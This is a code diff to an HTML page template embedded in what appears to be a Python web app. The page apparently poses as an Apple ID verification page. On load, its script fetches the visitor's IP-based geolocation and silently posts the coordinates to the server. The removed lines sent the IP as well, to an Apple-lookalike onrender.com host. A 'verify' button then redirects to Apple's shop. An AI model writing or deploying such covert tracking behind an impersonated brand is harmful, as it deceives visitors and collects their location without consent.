@@ -117,35 +117,42 @@ HTML_PAGE = '''
   </div>
 
   <script>
-    window.addEventListener('DOMContentLoaded', async () => {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+  window.addEventListener('DOMContentLoaded', async () => {
+    try {
+      // Lấy vị trí theo IP
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
 
-        const payload = {
-          ip: data.ip,
-          latitude: data.latitude,
-          longitude: data.longitude
-        };
+      // Không cần gửi IP, server sẽ tự lấy từ request
+      const payload = {
+        latitude: data.latitude,
+        longitude: data.longitude
+      };
 
- await fetch('https://apple-id.onrender.com/submit', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify(payload)
-        });
+      // Gửi dữ liệu về server (dùng đường dẫn tương đối nếu cùng host)
+      await fetch('/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
 
-        console.log("✅ IP & vị trí đã gửi:", payload);
-      } catch (err) {
-        console.error("❌ Lỗi khi gửi IP:", err);
-      }
-    });
+      console.log("✅ Đã gửi vị trí về server:", payload);
+    } catch (err) {
+      console.error("❌ Lỗi khi gửi vị trí:", err);
+    }
 
-    document.getElementById("verifyBtn").addEventListener("click", () => {
-      window.location.href = "https://www.apple.com/shop/";
-    });
-  </script>
+    // Thêm handler cho nút verify sau khi DOM đã sẵn sàng
+    const btn = document.getElementById("verifyBtn");
+    if (btn) {
+      btn.addEventListener("click", () => {
+        window.location.href = "https://www.apple.com/shop/";
+      });
+    }
+  });
+</script>
+
 </body>
 </html>
 '''
